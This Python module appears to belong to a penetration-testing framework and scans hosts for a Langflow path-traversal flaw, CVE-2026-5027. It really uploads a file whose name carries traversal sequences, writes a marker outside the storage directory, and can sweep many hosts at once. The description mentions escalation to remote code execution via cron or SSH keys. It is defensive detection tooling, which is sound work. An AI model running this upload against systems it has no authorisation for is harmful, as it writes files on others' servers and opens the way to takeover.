import json
import secrets
import ssl
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar


VULN_VERSION_CAP = (1, 8, 4)
TRAVERSAL_DEPTH = 9


@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    version: str = ""
    auth_method: str = ""
    written_path: str = ""


def _version_tuple(v):
    try:
        return tuple(int(x) for x in v.split("."))
    except (ValueError, AttributeError):
        return (0,)


class LangflowPathTraversalScanner(Auxiliary):
    NAME = "Langflow Path Traversal Scanner (CVE-2026-5027)"
    DESCRIPTION = (
        "Detects the path traversal in Langflow's POST /api/v2/files endpoint. "
        "The multipart filename is not sanitized, so an attacker can write "
        "files outside the intended storage directory. When auto-login is "
        "enabled (the default), this is exploitable without credentials and "
        "escalates to RCE via cron job injection or SSH key overwrite. The "
        "scanner writes a marker file to /tmp, confirms the traversal by "
        "checking whether the returned path still contains '..' segments, "
        "and cleans up. Non-destructive."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    SEVERITY = "critical"
    DISCLOSED = "2026-03-27"
    CHECK = True
    REFERENCES = [
        "CVE-2026-5027",
        "https://nvd.nist.gov/vuln/detail/CVE-2026-5027",
        "https://github.com/EQSTLab/CVE-2026-5027",
        "https://github.com/langflow-ai/langflow/pull/12227",
        "https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c",
        "https://www.tenable.com/security/research/tra-2026-26",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=7860, type=int, description="Langflow HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("USERNAME", default="", description="username if auto-login is disabled"),
        Option("PASSWORD", default="", description="password if auto-login is disabled"),
        Option("WRITE_PATH", default="/tmp",
               description="directory to write the marker file into"),
        Option("CLEANUP", default=True, type=bool,
               description="attempt to delete the marker file after confirmation"),
        Option("VERBOSE", default=False, type=bool,
               description="show per-host step details during scans"),
        Option("TIMEOUT", default=15.0, type=float, description="per-request timeout"),
        Option("THREADS", default=20, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def __init__(self):
        super().__init__()
        self._bar = None

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            self._log(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _log(self, msg):
        if self._bar is not None:
            self._bar.log(msg)
        else:
            print(msg)

    def _debug(self, msg):
        if self.options.get("VERBOSE"):
            self._log(colors.dimmed("  " + msg))

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _get_json(self, host, path, headers=None, timeout=None):
        url = self._base(host) + path
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Accept", "application/json")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with urllib.request.urlopen(
                req, timeout=timeout or self.options["TIMEOUT"], context=ctx
            ) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")

    def _post_login(self, host, username, password):
        url = self._base(host) + "/api/v1/login"
        ctx = ssl._create_unverified_context()
        body = json.dumps({"username": username, "password": password}).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Content-Type", "application/json")
        req.add_header("Accept", "application/json")
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")

    def _upload(self, host, token, remote_path, content):
        boundary = "----metis" + secrets.token_hex(12)
        traversal = "../" * TRAVERSAL_DEPTH
        filename = traversal + remote_path.lstrip("/")

        parts = [
            "--" + boundary,
            'Content-Disposition: form-data; name="file"; filename="' + filename + '"',
            "Content-Type: application/octet-stream",
            "",
            content,
            "--" + boundary + "--",
            "",
        ]
        body = "\r\n".join(parts).encode()

        url = self._base(host) + "/api/v2/files"
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
        req.add_header("Authorization", "Bearer " + token)
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")

    def _delete_file(self, host, token, file_id):
        url = self._base(host) + "/api/v2/files/" + urllib.parse.quote(str(file_id))
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url, method="DELETE")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Authorization", "Bearer " + token)
        try:
            with urllib.request.urlopen(req, timeout=self.options["TIMEOUT"], context=ctx) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")

    def _get_token(self, host):
        st, body = self._get_json(host, "/api/v1/auto_login")
        if st == 200:
            try:
                token = json.loads(body).get("access_token")
                if token:
                    return token, "auto-login"
            except ValueError:
                pass

        username = self.options["USERNAME"].strip()
        password = self.options["PASSWORD"].strip()
        if username and password:
            st, body = self._post_login(host, username, password)
            if st == 200:
                try:
                    token = json.loads(body).get("access_token")
                    if token:
                        return token, "credentials"
                except ValueError:
                    pass

        return None, None

    def _get_version(self, host):
        st, body = self._get_json(host, "/api/v1/version", timeout=5.0)
        if st != 200:
            return ""
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                return data.get("version") or data.get("langflow_version") or ""
            if isinstance(data, str):
                return data
        except ValueError:
            pass
        return ""

    def _probe(self, host):
        result = HostResult(host=host)

        version = self._get_version(host)
        if version:
            result.version = version
            self._debug(host + ": version " + version)
            if _version_tuple(version) > VULN_VERSION_CAP:
                result.state = "safe"
                result.detail = "version " + version + " is patched"
                return result
        else:
            self._debug(host + ": version not detected")

        try:
            token, method = self._get_token(host)
        except urllib.error.URLError as e:
            result.detail = "connection failed (" + type(e).__name__ + ")"
            return result

        if not token:
            result.state = "safe"
            result.detail = "no token (auto-login disabled, no credentials)"
            return result

        result.auth_method = method
        self._debug(host + ": token via " + method)

        marker = "metis_" + secrets.token_hex(8)
        remote_path = self.options["WRITE_PATH"].rstrip("/") + "/" + marker + ".txt"
        content = "CVE-2026-5027 detection marker: " + marker

        try:
            st, body = self._upload(host, token, remote_path, content)
        except urllib.error.URLError as e:
            result.detail = "upload failed (" + type(e).__name__ + ")"
            return result

        if st not in (200, 201):
            result.state = "safe"
            result.detail = "upload rejected (HTTP " + str(st) + ")"
            return result

        try:
            data = json.loads(body)
        except ValueError:
            result.state = "unknown"
            result.detail = "upload returned non-JSON"
            return result

        returned_path = data.get("path") or ""
        file_id = data.get("id")

        if not returned_path:
            result.state = "unknown"
            result.detail = "no path in upload response"
            return result

        resolved = returned_path.replace("\\", "/")

        if ".." not in resolved:
            result.state = "safe"
            result.detail = "filename sanitized (" + resolved + ")"
            return result

        result.state = "vulnerable"
        result.detail = "traversal preserved"
        result.written_path = resolved

        if self.options["CLEANUP"] and file_id:
            try:
                d_st, _ = self._delete_file(host, token, file_id)
                if d_st in (200, 204):
                    self._debug(host + ": marker deleted (id " + str(file_id) + ")")
                else:
                    self._log(colors.warn("  " + host + ": cleanup returned HTTP " + str(d_st)))
            except urllib.error.URLError:
                self._log(colors.warn("  " + host + ": cleanup request failed"))

        return result

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="Langflow" + (" " + h.version if h.version else ""),
        )
        info = h.detail + " | auth=" + (h.auth_method or "?")
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2026-5027",
            info=info,
        )
        if h.written_path:
            self.note(
                "langflow_write=" + h.written_path,
                address=h.host,
                kind="langflow_write",
            )

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        self._log(colors.info("check: probing " + self._base(host)))
        self._log(colors.dimmed("  target: POST /api/v2/files"))

        self.options["VERBOSE"] = True

        try:
            r = self._probe(host)
        except Exception as e:
            self._log(colors.bad("check failed: " + type(e).__name__ + ": " + str(e)))
            return CheckResult.UNKNOWN

        if r.state == "vulnerable":
            self._log(colors.vuln("check: " + host + " vulnerable"))
            self._log(colors.dimmed("  auth:  " + r.auth_method))
            self._log(colors.dimmed("  path:  " + r.written_path))
            return CheckResult.VULNERABLE

        if r.state == "safe":
            self._log(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE

        self._log(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        self._log(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        if not self.options.get("VERBOSE"):
            self._log(colors.dimmed("  set VERBOSE true to see per-host details"))

        bar = ProgressBar(total=len(targets), prefix="scan")
        self._bar = bar

        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        line = r.host
                        if r.version:
                            line += " (" + r.version + ")"
                        line += " - " + r.detail
                        bar.log(colors.vuln(line))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()
            self._bar = None

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.yellow(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                version = (" v" + h.version) if h.version else ""
                print("    " + colors.vuln(h.host) + version + "  " + colors.dimmed(h.detail))
                print("      " + colors.session(h.written_path))

        return hits
